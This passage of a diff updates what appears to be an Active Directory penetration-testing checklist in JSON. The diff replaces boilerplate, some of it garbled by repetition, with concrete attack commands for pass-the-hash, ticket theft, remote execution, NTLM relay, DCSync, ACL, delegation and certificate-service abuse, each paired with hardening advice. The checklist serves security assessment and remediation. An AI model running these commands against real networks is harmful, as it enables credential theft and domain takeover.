           "description": "Convert an NT/AES hash into a Kerberos TGT (overpass-the-hash) so subsequent access uses Kerberos rather than NTLM, blending in better and enabling Kerberos-only services.",
           "severity": "high",
-          "how_to_find": "Validate overpass-the-hash to a kerberos tgt in Lateral Movement — Pass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for overpass-the-hash to a kerberos tgt, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Turn an NT/AES key into a Kerberos TGT (avoids NTLM detections):\n\n```\ngetTGT.py <domain>/<user> -hashes :<nthash>\n# or Rubeus asktgt /user:<u> /rc4:<nthash>\n```",
+          "how_to_fix": "Disable RC4 (enforce AES), enable Credential Guard, tier admins, and monitor for anomalous TGT requests. Rotate exposed keys. Re-test.",
           "tools": [
             "Rubeus",
             "Mimikatz",
@@ -1872,8 +1872,8 @@
           "title": "Pass AES keys where RC4 is disabled",
           "description": "When environments disable RC4 and require AES, use recovered AES128/AES256 keys for authentication instead of the legacy NT hash, ensuring lateral movement still works under hardened crypto policy.",
           "severity": "medium",
-          "how_to_find": "Validate pass aes keys where rc4 is disabled in Lateral Movement — Pass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for pass aes keys where rc4 is disabled, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Use AES keys instead of RC4:\n\n```\ngetTGT.py <domain>/<user> -aesKey <aes256key>\n# Rubeus asktgt /user:<u> /aes256:<key>\n```",
+          "how_to_fix": "Protect key material (Credential Guard, tiering), rotate exposed keys/passwords, and monitor Kerberos anomalies. Re-test.",
           "tools": [
             "Rubeus",
             "impacket"
@@ -1904,8 +1904,8 @@
           "title": "Harvest Kerberos tickets",
           "description": "Extract TGTs and service tickets from memory or the ticket cache on compromised hosts.",
           "severity": "high",
-          "how_to_find": "Validate harvest kerberos tickets in Lateral Movement — Pass-the-Ticket & Overpass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for harvest kerberos tickets, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Extract tickets for reuse:\n\n```\nRubeus.exe dump /nowrap\n# mimikatz sekurlsa::tickets /export\n```",
+          "how_to_fix": "Enable Credential Guard, restrict privileged logons (tiering, Protected Users), and shorten ticket lifetimes. Re-test harvesting is blocked.",
           "tools": [
             "Rubeus",
             "Mimikatz",
@@ -1932,8 +1932,8 @@
           "title": "Inject tickets into a session",
           "description": "Load a stolen ticket into the current logon session (Rubeus ptt / Mimikatz kerberos::ptt) and access resources as the ticket owner without their password or hash.",
           "severity": "high",
-          "how_to_find": "Validate inject tickets into a session in Lateral Movement — Pass-the-Ticket & Overpass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for inject tickets into a session, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Pass a stolen ticket:\n\n```\nRubeus.exe ptt /ticket:<b64-or-kirbi>\n# mimikatz kerberos::ptt ticket.kirbi\n```",
+          "how_to_fix": "Same ticket-theft controls: Credential Guard, tiering, short lifetimes, and monitor for anomalous ticket use. Rotate accounts if a TGT was stolen. Re-test.",
           "tools": [
             "Rubeus",
             "Mimikatz"
@@ -1959,8 +1959,8 @@
           "title": "Reuse ccache tickets on Linux/impacket",
           "description": "Convert tickets to ccache format and set KRB5CCNAME so impacket tools authenticate via Kerberos, enabling cross-platform ticket reuse from an attacker Linux host.",
           "severity": "medium",
-          "how_to_find": "Validate reuse ccache tickets on linux/impacket in Lateral Movement — Pass-the-Ticket & Overpass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for reuse ccache tickets on linux/impacket, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Use a stolen ccache with impacket:\n\n```\nexport KRB5CCNAME=ticket.ccache\npsexec.py -k -no-pass <domain>/<user>@<host>\n```",
+          "how_to_fix": "Protect ticket caches (host hardening, least privilege), tier admins, and monitor. Rotate accounts if tickets were stolen. Re-test.",
           "tools": [
             "impacket",
             "Rubeus",
@@ -1987,8 +1987,8 @@
           "title": "Request service tickets with a stolen TGT",
           "description": "Use an injected TGT to request TGS tickets for specific services (CIFS, HOST, LDAP, MSSQL), enabling targeted access without re-authenticating.",
           "severity": "medium",
-          "how_to_find": "Validate request service tickets with a stolen tgt in Lateral Movement — Pass-the-Ticket & Overpass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for request service tickets with a stolen tgt, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Use a stolen TGT to request service tickets:\n\n```\nRubeus.exe asktgs /ticket:<tgt> /service:cifs/<host> /ptt\n```",
+          "how_to_fix": "Credential Guard + tiering + short TGT lifetimes; rotate the affected account. Monitor for TGS requests inconsistent with the user. Re-test.",
           "tools": [
             "Rubeus",
             "impacket (getST)"
@@ -2014,8 +2014,8 @@
           "title": "Overpass-the-Hash into a fresh TGT",
           "description": "When you hold only a hash/key, request a brand-new TGT from the KDC (overpass-the-hash) and proceed with Pass-the-Ticket, bridging NTLM credential material into the Kerberos world.",
           "severity": "high",
-          "how_to_find": "Validate overpass-the-hash into a fresh tgt in Lateral Movement — Pass-the-Ticket & Overpass-the-Hash. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for overpass-the-hash into a fresh tgt, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Mint a fresh TGT from a hash/key:\n\n```\nRubeus.exe asktgt /user:<u> /rc4:<nthash> /ptt\n```",
+          "how_to_fix": "Disable RC4 (AES only), enable Credential Guard, tier admins, and rotate exposed keys. Re-test.",
           "tools": [
             "Rubeus",
             "impacket (getTGT)",
@@ -2047,8 +2047,8 @@
           "title": "Execute via SMB/PSExec-style service creation",
           "description": "Use psexec-style execution (service creation over SMB with named-pipe I/O) to run commands as SYSTEM on hosts where you hold admin.",
           "severity": "high",
-          "how_to_find": "Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Use psexec-style execution (service creation over SMB with named-pipe I/O) to run commands as SYSTEM on hosts where you hold admin",
-          "how_to_fix": "Assign an owner for execute via smb/psexec-style service creation, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Run commands by creating a remote service:\n\n```\npsexec.py <domain>/<user>:<pass>@<ip>\nnxc smb <ip> -u <user> -p <pass> -x \"whoami\"\n```",
+          "how_to_fix": "Restrict local/domain admin, segment admin protocols to jump hosts, require SMB signing, and deploy EDR (service-creation detections 7045). Rotate exposed creds. Re-test.",
           "tools": [
             "impacket (psexec)",
             "netexec/crackmapexec",
@@ -2075,8 +2075,8 @@
           "title": "Execute via WMI",
           "description": "Use WMI (wmiexec) to run commands without installing a service, reducing artifacts compared to PSExec.",
           "severity": "high",
-          "how_to_find": "Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Use WMI (wmiexec) to run commands without installing a service, reducing artifacts compared to PSExec",
-          "how_to_fix": "Assign an owner for execute via wmi, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Remote exec via WMI (no service artifact):\n\n```\nwmiexec.py <domain>/<user>:<pass>@<ip>\n```",
+          "how_to_fix": "Restrict admin, monitor WMI activity, segment management, and deploy EDR. Rotate exposed creds. Re-test.",
           "tools": [
             "impacket (wmiexec)",
             "netexec/crackmapexec",
@@ -2103,8 +2103,8 @@
           "title": "Execute via WinRM",
           "description": "Use WinRM (evil-winrm, PowerShell remoting) on hosts where port 5985/5986 is open and the user is in Remote Management Users or local admins, providing an interactive PowerShell session.",
           "severity": "high",
-          "how_to_find": "Validate execute via winrm in Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for execute via winrm, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Remote exec via WinRM/PSRemoting:\n\n```\nevil-winrm -i <ip> -u <user> -p <pass>\n```",
+          "how_to_fix": "Restrict WinRM to admins/jump hosts, use HTTPS + auth hardening, log PowerShell/WinRM, and deploy EDR. Rotate exposed creds. Re-test.",
           "tools": [
             "evil-winrm",
             "netexec/crackmapexec"
@@ -2130,8 +2130,8 @@
           "title": "Execute via DCOM",
           "description": "Abuse DCOM objects (MMC20.Application, ShellWindows, ShellBrowserWindow) to execute commands on remote hosts, a stealthier lateral path that avoids service creation and named pipes.",
           "severity": "medium",
-          "how_to_find": "Validate execute via dcom in Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for execute via dcom, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Remote exec via DCOM objects (e.g. MMC20, ShellWindows):\n\n```\ndcomexec.py <domain>/<user>:<pass>@<ip>\n```",
+          "how_to_fix": "Restrict admin, harden DCOM/firewall, monitor for DCOM lateral movement, and deploy EDR. Rotate creds. Re-test.",
           "tools": [
             "impacket (dcomexec)",
             "PowerShell"
@@ -2157,8 +2157,8 @@
           "title": "Execute via scheduled tasks / service control",
           "description": "Create remote scheduled tasks (atexec) or remote services (sc) for execution where other protocols are blocked, offering an alternative when SMB exec or WinRM is filtered.",
           "severity": "medium",
-          "how_to_find": "Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): Lateral Movement — Remote Execution (PSExec/WMI/WinRM/DCOM): A remote task/service runs your payload and is cleaned up afterward",
-          "how_to_fix": "Assign an owner for execute via scheduled tasks / service control, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Remote exec via schtasks/sc:\n\n```\natexec.py <domain>/<user>:<pass>@<ip> \"whoami\"\n```",
+          "how_to_fix": "Restrict admin, monitor scheduled-task/service creation (4698/7045), segment management, and deploy EDR. Rotate creds. Re-test.",
           "tools": [
             "impacket (atexec)",
             "schtasks",
@@ -2190,8 +2190,8 @@
           "title": "Relay to SMB for execution or SAM dump",
           "description": "Relay captured/coerced NTLM authentication to SMB on hosts lacking signing to execute commands or dump the SAM as the relayed user.",
           "severity": "critical",
-          "how_to_find": "Validate relay to smb for execution or sam dump in Lateral Movement — NTLM Relay. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for relay to smb for execution or sam dump, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Relay coerced/poisoned NTLM to SMB (no signing):\n\n```\nntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'   # or --dump-sam\n```",
+          "how_to_fix": "Require SMB signing on all hosts (GPO), disable NTLM where possible, and remove the capture/coercion source (LLMNR/NBT-NS, PetitPotam). Re-test relay fails.",
           "tools": [
             "impacket (ntlmrelayx)",
             "Responder"
@@ -2217,8 +2217,8 @@
           "title": "Relay to LDAP/LDAPS for directory writes",
           "description": "Relay machine or user authentication to LDAP/LDAPS to grant DCSync rights, configure RBCD on a computer object, or add a user to a privileged group when channel binding/signing is not enforced.",
           "severity": "critical",
-          "how_to_find": "Validate relay to ldap/ldaps for directory writes in Lateral Movement — NTLM Relay. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for relay to ldap/ldaps for directory writes, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Relay to LDAP to write directory objects (e.g. set RBCD, add computer):\n\n```\nntlmrelayx.py -t ldaps://<dc-ip> --delegate-access --escalate-user <you>\n```",
+          "how_to_fix": "Enforce LDAP signing + channel binding (LDAPS), disable NTLM where possible, and remove coercion sources. Re-test LDAP relay fails.",
           "tools": [
             "impacket (ntlmrelayx)",
             "PetitPotam",
@@ -2245,8 +2245,8 @@
           "title": "Relay to ADCS HTTP enrollment (ESC8)",
           "description": "Coerce a DC or privileged machine and relay its NTLM authentication to the ADCS web enrollment endpoint to obtain a certificate for that machine, then use the cert to authenticate (PKINIT) and pivot to DCSync.",
           "severity": "critical",
-          "how_to_find": "Validate relay to adcs http enrollment (esc8) in Lateral Movement — NTLM Relay. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for relay to adcs http enrollment (esc8), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Relay coerced DC auth to the CA web enrollment to obtain a DC certificate:\n\n```\nntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController\n```\n\nThen authenticate as the DC with the cert = domain compromise (critical).",
+          "how_to_fix": "Disable NTLM on the CA web enrollment, enable EPA + require HTTPS, remove/harden vulnerable endpoints, patch coercion (PetitPotam), and require SMB/LDAP signing. Re-test ESC8 relay fails.",
           "tools": [
             "impacket (ntlmrelayx)",
             "Certipy",
@@ -2273,8 +2273,8 @@
           "title": "Chain coercion with cross-protocol relay",
           "description": "Combine a coercion trigger (PetitPotam/PrinterBug/DFSCoerce) with a relay target to force a high-value machine (often a DC) to authenticate and relay it where it does the most damage (LDAP or ADCS).",
           "severity": "critical",
-          "how_to_find": "Validate chain coercion with cross-protocol relay in Lateral Movement — NTLM Relay. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for chain coercion with cross-protocol relay, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Combine forced auth with relay to a different protocol:\n\n```\ncoercer coerce -t <dc> -l <me> ...   # then ntlmrelayx to LDAP/ADCS\n```",
+          "how_to_fix": "Patch coercion vectors, disable Print Spooler on DCs, enforce signing/EPA/channel binding on all relay targets, and disable NTLM where feasible. Re-test the chain fails.",
           "tools": [
             "PetitPotam",
             "Coercer",
@@ -2302,8 +2302,8 @@
           "title": "Assess relay mitigations (signing/EPA/channel binding)",
           "description": "Evaluate whether SMB signing, LDAP signing, LDAP channel binding, and Extended Protection for Authentication are enforced.",
           "severity": "medium",
-          "how_to_find": "Validate assess relay mitigations (signing/epa/channel binding) in Lateral Movement — NTLM Relay. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for assess relay mitigations (signing/epa/channel binding), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Inventory whether signing/EPA/channel-binding are enforced:\n\n```\nnxc smb <range> --gen-relay-list relay.txt      # SMB signing not required\nnxc ldap <dc-ip> -u <user> -p <pass> -M ldap-checker   # LDAP signing/CB\n```",
+          "how_to_fix": "Enforce SMB signing everywhere, LDAP signing + channel binding on DCs, and EPA on web/ADCS enrollment; disable NTLM where possible. Re-run the checks to confirm mitigations are on.",
           "tools": [
             "netexec/crackmapexec",
             "nmap"
@@ -2334,8 +2334,8 @@
           "title": "Reset a target password (ForceChangePassword/GenericAll)",
           "description": "With ForceChangePassword or GenericAll over a user, reset their password to a known value, then authenticate as them.",
           "severity": "high",
-          "how_to_find": "Validate reset a target password (forcechangepassword/genericall) in Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for reset a target password (forcechangepassword/genericall), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With `ForceChangePassword`/`GenericAll`, reset the victim's password:\n\n```\nnet rpc password <victim> -U <domain>/<you>%<pass> -S <dc>\n# or: Set-DomainUserPassword -Identity <victim> -AccountPassword <pw>\n```",
+          "how_to_fix": "Remove the excessive right from non-admins, restore protected-object ACLs, monitor password-reset events (4724), and tier administration. Re-audit the DACL.",
           "tools": [
             "PowerView",
             "net rpc",
@@ -2362,8 +2362,8 @@
           "title": "Add yourself to a privileged group (GenericWrite/WriteMember)",
           "description": "With write access to a group, add a controlled account to it.",
           "severity": "high",
-          "how_to_find": "Validate add yourself to a privileged group (genericwrite/writemember) in Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for add yourself to a privileged group (genericwrite/writemember), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With write to a group's membership, add yourself:\n\n```\nnet rpc group addmem \"<group>\" <you> -U <domain>/<you>%<pass> -S <dc>\n# or: Add-DomainGroupMember -Identity '<group>' -Members <you>\n```",
+          "how_to_fix": "Remove write access to privileged group membership, protect groups via AdminSDHolder/SDProp, monitor 4728/4732, and alert on privileged-group changes. Re-audit ACLs.",
           "tools": [
             "PowerView",
             "net group",
@@ -2390,8 +2390,8 @@
           "title": "Grant DCSync via WriteDACL on the domain",
           "description": "With WriteDACL on the domain object, add an ACE granting the replication extended rights to a controlled principal, then perform DCSync.",
           "severity": "critical",
-          "how_to_find": "Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite): Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite): Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite): Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite): Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite): You add replication rights via WriteDACL and confirm DCSync now works for your principal",
-          "how_to_fix": "Assign an owner for grant dcsync via writedacl on the domain, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With `WriteDacl` on the domain head, grant yourself replication rights, then DCSync:\n\n```\ndacledit.py -action write -rights DCSync -principal <you> -target-dn \"DC=corp,DC=local\" <domain>/<you>:<pass>\nsecretsdump.py -just-dc <domain>/<you>:<pass>@<dc>\n```",
+          "how_to_fix": "Remove `WriteDacl`/`WriteOwner` on the domain object from non-admins, monitor DACL changes + 4662, and restore correct ACLs. Re-audit domain-object permissions.",
           "tools": [
             "PowerView",
             "impacket (dacledit)",
@@ -2418,8 +2418,8 @@
           "title": "Abuse write to msDS-KeyCredentialLink (Shadow Credentials)",
           "description": "With GenericWrite/GenericAll over a target, add a key credential (Shadow Credentials) and authenticate as the target via PKINIT, recovering its NT hash without changing its password.",
           "severity": "high",
-          "how_to_find": "Validate abuse write to msds-keycredentiallink (shadow credentials) in Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse write to msds-keycredentiallink (shadow credentials), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Add a key credential to a target and authenticate as them via PKINIT:\n\n```\ncertipy shadow auto -u <you>@<domain> -p <pass> -account <victim>\n# or Whisker add /target:<victim>\n```",
+          "how_to_fix": "Remove write access to `msDS-KeyCredentialLink` from non-admins, monitor writes, and protect privileged objects. Re-audit ACLs.",
           "tools": [
             "Certipy",
             "pyWhisker",
@@ -2446,8 +2446,8 @@
           "title": "Take ownership via WriteOwner then rewrite the DACL",
           "description": "With WriteOwner on an object, set yourself as owner, grant yourself full control via WriteDACL, and then exercise any of the above primitives.",
           "severity": "high",
-          "how_to_find": "Validate take ownership via writeowner then rewrite the dacl in Privilege Escalation & Delegation — ACL Abuse (GenericAll/WriteDACL/GenericWrite). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for take ownership via writeowner then rewrite the dacl, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With `WriteOwner`, set yourself owner, grant full control, then abuse it:\n\n```\nowneredit.py -action write -new-owner <you> -target <victim> <domain>/<you>:<pass>\ndacledit.py -action write -rights FullControl -principal <you> -target <victim> ...\n```",
+          "how_to_fix": "Remove `WriteOwner` from non-admins, restore correct owners/ACLs on privileged objects, and monitor owner/DACL changes. Re-audit.",
           "tools": [
             "PowerView",
             "impacket (owneredit)",
@@ -2479,8 +2479,8 @@
           "title": "Abuse unconstrained delegation",
           "description": "On a host trusted for unconstrained delegation, capture TGTs of any user that authenticates to it.",
           "severity": "critical",
-          "how_to_find": "Validate abuse unconstrained delegation in Privilege Escalation & Delegation — Kerberos Delegation Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse unconstrained delegation, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "On a host with unconstrained delegation, capture TGTs of connecting users (esp. coerce a DC):\n\n```\nRubeus.exe monitor /interval:5 /nowrap\n# coerce a DC to authenticate, then extract its TGT\n```\n\nDC TGT = domain compromise (critical).",
+          "how_to_fix": "Remove unconstrained delegation (use constrained/RBCD with protocol restrictions), add privileged accounts to Protected Users / mark \"sensitive & cannot be delegated\", and disable Print Spooler on DCs. Re-audit delegation flags.",
           "tools": [
             "Rubeus",
             "Mimikatz",
@@ -2508,8 +2508,8 @@
           "title": "Abuse constrained delegation (S4U2Self/S4U2Proxy)",
           "description": "On an account configured for constrained delegation, use S4U2Self and S4U2Proxy to obtain a service ticket impersonating any user (including DA) to the allowed target service.",
           "severity": "critical",
-          "how_to_find": "Validate abuse constrained delegation (s4u2self/s4u2proxy) in Privilege Escalation & Delegation — Kerberos Delegation Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse constrained delegation (s4u2self/s4u2proxy), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "With constrained delegation + a controlled account, impersonate any user to the allowed service:\n\n```\ngetST.py -spn cifs/<target> -impersonate administrator <domain>/<svc>:<pass> -dc-ip <dc>\n```",
+          "how_to_fix": "Restrict which accounts have constrained delegation, avoid protocol transition (`TrustedToAuthForDelegation`) where possible, protect sensitive accounts (Protected Users / not-delegatable), and monitor S4U. Re-audit delegation config.",
           "tools": [
             "Rubeus",
             "impacket (getST)"
@@ -2535,8 +2535,8 @@
           "title": "Abuse resource-based constrained delegation (RBCD)",
           "description": "With write access to a computer object (or a created machine account), set msDS-AllowedToActOnBehalfOfOtherIdentity to a controlled SPN, then use S4U to impersonate any user to that computer.",
           "severity": "critical",
-          "how_to_find": "Validate abuse resource-based constrained delegation (rbcd) in Privilege Escalation & Delegation — Kerberos Delegation Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for abuse resource-based constrained delegation (rbcd), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a target, set RBCD to a controlled computer account and impersonate:\n\n```\nrbcd.py -delegate-to <target$> -delegate-from <you$> -action write <domain>/<you>:<pass>\ngetST.py -spn cifs/<target> -impersonate administrator <domain>/<you$>:<pass>\n```",
+          "how_to_fix": "Remove write access to `msDS-AllowedToActOnBehalfOfOtherIdentity` from non-admins, restrict `ms-DS-MachineAccountQuota` to 0, protect privileged accounts, and monitor the attribute. Re-audit ACLs.",
           "tools": [
             "impacket (rbcd)",
             "Rubeus",
@@ -2564,8 +2564,8 @@
           "title": "Create a machine account for delegation abuse",
           "description": "Where MachineAccountQuota allows, create a new computer account you control to serve as the delegation source for RBCD attacks, removing the need for an existing controllable SPN.",
           "severity": "high",
-          "how_to_find": "Validate create a machine account for delegation abuse in Privilege Escalation & Delegation — Kerberos Delegation Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for create a machine account for delegation abuse, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Add a computer account (default quota lets any user add 10) to use in RBCD/S4U:\n\n```\naddcomputer.py -computer-name 'evil$' -computer-pass <pass> <domain>/<user>:<pass> -dc-ip <dc>\n```",
+          "how_to_fix": "Set `ms-DS-MachineAccountQuota` to 0 (only delegated admins add computers), monitor computer-account creation (4741), and restrict delegation-related ACLs. Re-check the quota.",
           "tools": [
             "impacket (addcomputer)",
             "PowerMad",
@@ -2592,8 +2592,8 @@
           "title": "Self-RBCD and protocol transition edge cases",
           "description": "Explore edge cases such as configuring RBCD on a computer you already partly control or leveraging protocol transition (TrustedToAuthForDelegation) to impersonate even without the user authenticating.",
           "severity": "high",
-          "how_to_find": "Validate self-rbcd and protocol transition edge cases in Privilege Escalation & Delegation — Kerberos Delegation Abuse. Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for self-rbcd and protocol transition edge cases, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Explore self-RBCD / protocol-transition edges where a computer can act on behalf of users to its own services:\n\n```\n# analyze in BloodHound; abuse via rbcd.py + getST.py as above\n```",
+          "how_to_fix": "Audit and minimize delegation config (constrained/RBCD, protocol transition), protect privileged accounts, set machine-account quota to 0, and monitor. Re-assess delegation edges in BloodHound.",
           "tools": [
             "Rubeus",
             "impacket (getST)",
@@ -2625,8 +2625,8 @@
           "title": "Enumerate CAs and vulnerable templates",
           "description": "Enumerate certificate authorities, published templates, and their security settings with Certipy/Certify to identify ESC1-ESC8 misconfigurations such as enrollee-supplied SAN, dangerous EKUs, or weak enrollment ACLs.",
           "severity": "medium",
-          "how_to_find": "Validate enumerate cas and vulnerable templates in Privilege Escalation & Delegation — ADCS Certificate Abuse (ESC1-ESC8). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for enumerate cas and vulnerable templates, apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Find CAs and misconfigured templates (ESC1-ESC8):\n\n```\ncertipy find -u <user>@<domain> -p <pass> -dc-ip <dc-ip> -vulnerable -stdout\n```",
+          "how_to_fix": "Remediate each flagged template: remove enrollee-supplied SAN (ESC1), require manager approval/authorized signatures, restrict enroll rights, and fix CA flags (ESC6/7). Re-run certipy to confirm none are vulnerable.",
           "tools": [
             "Certipy",
             "Certify",
@@ -2653,8 +2653,8 @@
           "title": "Exploit ESC1 (enrollee-supplied SAN)",
           "description": "On a template allowing enrollee-supplied subjectAltName with client-auth EKU, request a certificate specifying a privileged user in the SAN, then authenticate as that user via PKINIT.",
           "severity": "critical",
-          "how_to_find": "Validate exploit esc1 (enrollee-supplied san) in Privilege Escalation & Delegation — ADCS Certificate Abuse (ESC1-ESC8). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for exploit esc1 (enrollee-supplied san), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "Request a cert specifying an arbitrary SAN (e.g. a DA), then authenticate as them:\n\n```\ncertipy req -u <user>@<domain> -p <pass> -ca <CA> -template <vuln> -upn administrator@<domain>\ncertipy auth -pfx administrator.pfx -dc-ip <dc>\n```",
+          "how_to_fix": "Disable `ENROLLEE_SUPPLIES_SUBJECT` on the template, require manager approval, restrict enroll permissions to intended principals, and enable CA auditing. Re-run certipy to confirm ESC1 is fixed.",
           "tools": [
             "Certipy",
             "Certify",
@@ -2681,8 +2681,8 @@
           "title": "Exploit CA-level flaws (ESC6/ESC7)",
           "description": "Abuse EDITF_ATTRIBUTESUBJECTALTNAME2 on the CA (ESC6) to specify arbitrary SANs on any template, or abuse Manage CA/Manage Certificates rights (ESC7) to issue or approve certificates and escalate.",
           "severity": "critical",
-          "how_to_find": "Validate exploit ca-level flaws (esc6/esc7) in Privilege Escalation & Delegation — ADCS Certificate Abuse (ESC1-ESC8). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for exploit ca-level flaws (esc6/esc7), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
+          "how_to_find": "ESC6: CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` (SAN in any request). ESC7: you hold CA management rights:\n\n```\ncertipy find ... -stdout   # confirm ESC6/ESC7\ncertipy ca -u <user>@<domain> -p <pass> -ca <CA> -add-officer <you>   # ESC7 abuse\n```",
+          "how_to_fix": "Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), restrict CA ManageCA/ManageCertificates rights (ESC7) to authorized admins, and audit CA config. Re-scan.",
           "tools": [
             "Certipy",
             "Certify"
@@ -2708,8 +2708,8 @@
           "title": "Exploit ESC8 (NTLM relay to web enrollment)",
           "description": "Coerce a privileged machine and relay its NTLM authentication to the unauthenticated/NTLM web enrollment endpoint to obtain a certificate for that machine, then PKINIT and DCSync.",
           "severity": "critical",
-          "how_to_find": "Validate exploit esc8 (ntlm relay to web enrollment) in Privilege Escalation & Delegation — ADCS Certificate Abuse (ESC1-ESC8). Save commands, screenshots, and affected resource identifiers.",
-          "how_to_fix": "Assign an owner for exploit esc8 (ntlm relay to web enrollment), apply vendor or CIS hardening guidance, validate in staging, then re-run the same test that exposed the gap.",
